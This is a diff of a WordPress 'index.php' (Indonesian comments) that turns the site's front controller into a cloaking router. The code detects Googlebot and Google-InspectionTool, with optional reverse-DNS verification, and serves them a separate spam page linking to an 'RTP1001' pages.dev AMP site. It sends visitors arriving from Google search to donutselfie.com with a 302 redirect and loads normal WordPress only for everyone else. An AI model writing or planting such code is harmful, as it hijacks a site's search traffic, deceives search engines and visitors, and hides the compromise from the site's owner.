@@ -1,71 +1,86 @@
 <?php
 /**
- * index.php — Router sederhana
- * - Googlebot/InspectionTool (opsional verifikasi IP): sajikan HTML khusus
+ * index.php — Router sederhana:
+ * - Googlebot / Google-InspectionTool (opsional verifikasi IP): sajikan HTML khusus
  * - Klik dari hasil Google: redirect ke REDIRECT_URL
- * - Lainnya: muat WordPress
- * (Jangan pakai "?>" penutup.)
+ * - Lainnya: muat WordPress (tema aktif)
+ *
+ * Pastikan file ini TIDAK memiliki "?>" penutup, dan tidak ada BOM/whitespace sebelum "<?php".
  */
 
 /* ========== Konfigurasi ========== */
 const REDIRECT_URL             = 'https://donutselfie.com';
-const ENABLE_GOOGLE_IP_VERIFY  = false;  // true → verifikasi IP Google (reverse+forward DNS)
+const ENABLE_GOOGLE_IP_VERIFY  = false;  // true = verifikasi IP Google via reverse+forward DNS
 const SEND_NOCACHE_ON_REDIRECT = true;   // kirim header no-cache saat redirect
-const ENABLE_FALLBACK_HINT     = true;   // redirect juga bila ada hint query (gclid/utm_source=google/amp_gsa)
 
 /* ========== Utilitas ========== */
 function serve_wp(): void {
-    if (!defined('WP_USE_THEMES')) define('WP_USE_THEMES', true);
+    // Front to the WordPress application
+    if (!defined('WP_USE_THEMES')) {
+        define('WP_USE_THEMES', true);
+    }
     require __DIR__ . '/wp-blog-header.php';
 }
-function ends_with(string $h, string $n): bool {
-    $len = strlen($n); if ($len === 0) return true; return substr($h, -$len) === $n;
-}
-function is_real_google_ip(string $ip): bool {
-    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;
-    $host = @gethostbyaddr($ip); if (!$host) return false;
-    if (!ends_with($host, '.googlebot.com') && !ends_with($host, '.google.com')) return false;
-    return @gethostbyname($host) === $ip;
+
+function ends_with(string $haystack, string $needle): bool {
+    $len = strlen($needle);
+    if ($len === 0) return true;
+    return substr($haystack, -$len) === $needle;
 }
 
-/* ========== Main ========== */
-ob_start(); // cegah "headers already sent"
-
-$ua  = $_SERVER['HTTP_USER_AGENT']  ?? '';
-$ref = $_SERVER['HTTP_REFERER']     ?? '';
-$ip  = $_SERVER['REMOTE_ADDR']      ?? '';
-
-$ua_l = strtolower($ua);
-
-// 1) Deteksi Googlebot/Inspection Tool
-$is_google_ua = (strpos($ua_l, 'googlebot') !== false) || (strpos($ua_l, 'google-inspectiontool') !== false);
-$is_verified_google = $is_google_ua && (!ENABLE_GOOGLE_IP_VERIFY || is_real_google_ip($ip));
-
-// 2) Deteksi referer Google/AMP/weblight/cache
-$is_google_ref = false;
-if ($ref) {
-    $is_google_ref = (bool) preg_match(
-        '~^https?://([a-z0-9-]+\.)*(google\.[a-z.]+|googleusercontent\.com|googleweblight\.com|cdn\.ampproject\.org)/~i',
-        $ref
-    );
+function is_google_domain(string $host): bool {
+    if ($host === '') return false;
+    $host = strtolower($host);
+    return $host === 'google.com'
+        || $host === 'google.co.id'
+        || ends_with($host, '.google.com')
+        || ends_with($host, '.google.co.id');
 }
 
-// 3) Fallback hint jika referer hilang (opsional)
-$has_hint = false;
-if (ENABLE_FALLBACK_HINT) {
-    $q = $_GET;
-    $has_hint =
-        (isset($q['gclid']) && $q['gclid'] !== '') ||
-        (isset($q['utm_source']) && strtolower($q['utm_source']) === 'google') ||
-        isset($q['amp_gsa']);
+function is_googlebot_ua(string $ua): bool {
+    $ua = strtolower($ua);
+    return (strpos($ua, 'googlebot') !== false) || (strpos($ua, 'google-inspectiontool') !== false);
 }
 
-/* ===== Cabang A: Googlebot/InspectionTool → sajikan HTML khusus ===== */
-if ($is_verified_google) {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(200);
+/**
+ * Verifikasi IP Google (opsional, aktifkan via ENABLE_GOOGLE_IP_VERIFY)
+ * - Reverse DNS harus berakhiran .googlebot.com atau .google.com
+ * - Lalu forward-resolve hostname tsb kembali ke IP asli
+ */
+function verify_google_ip(string $ip): bool {
+    $ptr = gethostbyaddr($ip);
+    if (!$ptr) return false;
 
-    echo <<<'HTML'
+    $ptr_l = strtolower($ptr);
+    $valid_ptr = ends_with($ptr_l, '.googlebot.com') || ends_with($ptr_l, '.google.com');
+    if (!$valid_ptr) return false;
+
+    // forward lookup dan cocokkan
+    $resolved = gethostbynamel($ptr);
+    if (!$resolved) return false;
+
+    return in_array($ip, $resolved, true);
+}
+
+/* ========== Main Routing ========== */
+// Ambil header yang relevan
+$userAgent = $_SERVER['HTTP_USER_AGENT']  ?? '';
+$referer   = $_SERVER['HTTP_REFERER']     ?? '';
+$clientIp  = $_SERVER['REMOTE_ADDR']      ?? '';
+
+// 1) Jika Googlebot / Google Inspection Tool → tampilkan HTML khusus (bukan WordPress)
+if (is_googlebot_ua($userAgent)) {
+    if (ENABLE_GOOGLE_IP_VERIFY) {
+        if (!verify_google_ip($clientIp)) {
+            // UA mengaku Google tapi IP bukan milik Google → jangan beri konten khusus
+            serve_wp();
+            return;
+        }
+    }
+
+    // ---- HTML khusus untuk Googlebot/Inspection Tool ----
+    // (Ganti blok HTML di bawah sesuai kebutuhan Anda)
+    ?>
 <!DOCTYPE html>
 <html
     class="js audio audio-ogg audio-mp3 audio-opus audio-wav audio-m4a cors cssanimations backgroundblendmode flexbox inputtypes-search inputtypes-tel inputtypes-url inputtypes-email no-inputtypes-datetime inputtypes-date inputtypes-month inputtypes-week inputtypes-time inputtypes-datetime-local inputtypes-number inputtypes-range inputtypes-color localstorage placeholder svg xhr2"
@@ -74,7 +89,7 @@ if ($is_verified_google) {
 
 <script type="text/javascript" async="" src="https://bat.bing.com/bat.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
 <script type="text/javascript" async="" src="https://s.pinimg.com/ct/core.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
-<link rel="amphtml" href="https://maucuan.pages.dev/rtp1001/" />
+<link rel="amphtml" href="https://RTP1001.pages.dev/amp" />
     <meta charset="utf-8">
     <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
         //<![CDATA[
@@ -2936,20 +2951,28 @@ if ($is_verified_google) {
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"5c7f94c07dc24623971c3ad69db061f7","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
-HTML;
-    exit;
+<?php
+    return;
 }
 
-/* ===== Cabang B: Klik dari Google atau ada hint → redirect ===== */
-if ($is_google_ref || $has_hint) {
-    if (SEND_NOCACHE_ON_REDIRECT) {
-        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
-        header('Pragma: no-cache');
-        header('Expires: 0');
+// 2) Jika pengunjung berasal dari hasil pencarian Google → redirect ke REDIRECT_URL
+if (!empty($referer)) {
+    $refHost = '';
+    $refParts = @parse_url($referer);
+    if (is_array($refParts) && isset($refParts['host'])) {
+        $refHost = $refParts['host'];
     }
-    header('Location: ' . REDIRECT_URL, true, 302);
-    exit;
+
+    if ($refHost && is_google_domain($refHost)) {
+        if (SEND_NOCACHE_ON_REDIRECT) {
+            header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+            header('Pragma: no-cache');
+            header('Expires: 0');
+        }
+        header('Location: ' . REDIRECT_URL, true, 302);
+        exit;
+    }
 }
 
-/* ===== Cabang C: Default → muat WordPress ===== */
+// 3) Lainnya → jalankan WordPress
 serve_wp();
